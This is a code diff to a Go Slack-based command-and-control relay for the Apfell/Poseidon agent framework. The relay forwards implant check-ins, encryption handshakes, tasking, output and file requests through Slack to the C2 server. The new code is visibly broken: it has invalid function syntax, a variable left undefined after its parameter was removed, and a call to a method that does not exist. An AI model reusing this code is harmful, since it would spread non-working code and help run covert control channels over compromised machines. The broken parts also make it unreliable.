@@ -89,43 +89,19 @@ func (s *SlackC2) SetApiHandle(newClient *slack.Client) {
 	s.ApiHandle = newClient
 }
 
-func (s SlackC2) GetNextTask(apfellID string) []byte {
+func (s SlackC2) GetNextTask() []byte {
 	//place holder
 	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", s.ApfellBaseURL(), apfellID)
 	return s.htmlGetData(url)
 }
 
-func (s SlackC2) PostResponse(taskid string, output []byte) []byte {
-	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", taskid)
-	return s.postRESTResponse(urlEnding, output)
+func (s *SlackC2) PostMessage([]byte msg) []byte {
+	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+	return s.htmlPostData(urlEnding, msg)
 }
 
-//postRESTResponse - Wrapper to post task responses through the Apfell rest API
-func (s *SlackC2) postRESTResponse(urlEnding string, data []byte) []byte {
-	size := len(data)
-	const dataChunk = 512000 //Normal apfell chunk size
-	r := bytes.NewBuffer(data)
-	chunks := uint64(math.Ceil(float64(size) / dataChunk))
-	var retData bytes.Buffer
-
-	for i := uint64(0); i < chunks; i++ {
-		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
-		dataBuffer := make([]byte, dataPart)
-
-		_, err := r.Read(dataBuffer)
-		if err != nil {
-			//fmt.Sprintf("Error reading %s: %s", err)
-			break
-		}
-
-		tResp := structs.TaskResponse{}
-		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
-		dataToSend, _ := json.Marshal(tResp)
-		ret := s.htmlPostData(urlEnding, dataToSend)
-		retData.Write(ret)
-	}
-
-	return retData.Bytes()
+func (s SlackC2) PostResponse(taskid string, output []byte) []byte {
+	return s.postMessage(output)
 }
 
 //htmlPostData HTTP POST function
@@ -258,93 +234,15 @@ func (s *SlackC2) handleResponseMessage(timestamp string, data []byte) {
 
 func (s *SlackC2) handleMessage(message interface{}) interface{} {
 	m := message.(Message)
+	s.GetApiHandle().Debugln("Received client message")
 
-	switch m.MType {
-	case CheckInMsg:
-		s.GetApiHandle().Debugln("Received CheckIn message")
-		resp := s.htmlPostData("api/v1.3/callbacks/", []byte(m.Data))
-
-		// Create the msg to respond to the client
-		re := Message{}
-		re.Data = string(resp)
-		re.MType = CheckInMsg
-
-		return re
-
-	case EKE:
-		s.GetApiHandle().Debugf("Received EKE message with IDType: %d", m.IDType)
-		s.GetApiHandle().Debugf("Message: %+v\n", m)
-		resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/EKE/%s", m.ID), []byte(m.Data))
-
-		if len(resp) == 0 {
-			s.GetApiHandle().Debugln("Empty response received from apfell. ...")
-			break
-		}
-
-		re := Message{}
-		re.Data = string(resp)
-		re.MType = EKE
-
-		return re
-	case AES:
-		s.GetApiHandle().Debugln("Received AES message")
-		s.GetApiHandle().Debugf("Message: %+v\n", m)
-		resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", m.ID), []byte(m.Data))
-		if len(resp) == 0 {
-			s.GetApiHandle().Debugf("Received empty response from apfell")
-			break
-		}
-
-		re := Message{}
-		re.Data = string(resp)
-		re.MType = AES
-
-		return re
-
-	case TaskMsg:
-		s.GetApiHandle().Debugln("Received task message")
-		s.GetApiHandle().Debugf("Message: %+v\n", m)
-		resp := s.GetNextTask(m.ID)
-
-		if len(resp) == 0 {
-			s.GetApiHandle().Debugln("Received empty response from Apfell.... retrying ")
-			time.Sleep(time.Duration(s.PollingInterval()) * time.Second)
-
-			resp = s.GetNextTask(m.ID)
-		}
-
-		re := Message{}
-		re.Data = string(resp)
-		re.MType = TaskMsg
-
-		return re
-
-	case ResponseMsg:
-		s.GetApiHandle().Debugln("Received Task response msg")
-		s.GetApiHandle().Debugf("Message: %+v\n", m)
-		resp := s.htmlPostData(fmt.Sprintf("api/v1.3/responses/%s", m.ID), []byte(m.Data))
-
-		re := Message{}
-		re.Data = string(resp)
-		re.MType = ResponseMsg
-
-		return re
-
-	case FileMsg:
-		s.GetApiHandle().Debugln("Received file msg")
-		s.GetApiHandle().Debugf("Message: %+v\n", m)
-		endpoint := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", m.ID, m.Tag)
-		url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), endpoint)
-		resp := s.htmlGetData(url)
-
-		re := Message{}
-		re.Data = string(resp)
-		re.MType = FileMsg
-
-		return re
-	}
-
-	return Message{}
+	raw := s.htmlPostData(fmt.Sprintf("api/v%s/agent_message", ApiVersion), []byte(m.Data))
+	
+	resp := structs.Message{}
+	resp.Client = false 
+	resp.Tag = m.Tag
+	resp.Data = string(raw)
+	return resp
 }
 
 func (s SlackC2) Run(config interface{}) {
@@ -361,13 +259,7 @@ func (s SlackC2) Run(config interface{}) {
 	logger := log.New(f, "poseidon-slackc2: ", log.Lshortfile|log.LstdFlags)
 
 	s.SetApiHandle(slack.New(s.GetKey(), slack.OptionDebug(s.Debug), slack.OptionLog(logger)))
-	// Join the channel
-	/*_, err := api.JoinChannel(s.GetChannelID())
-
-	if err != nil {
-		s.GetApiHandle().Debugf("Unable to join channel: %s, err: %s", s.GetChannelID(), err.Error())
-		os.Exit(-1)
-	}*/
+	
 
 	rtm := s.GetApiHandle().NewRTM()
 	go rtm.ManageConnection()
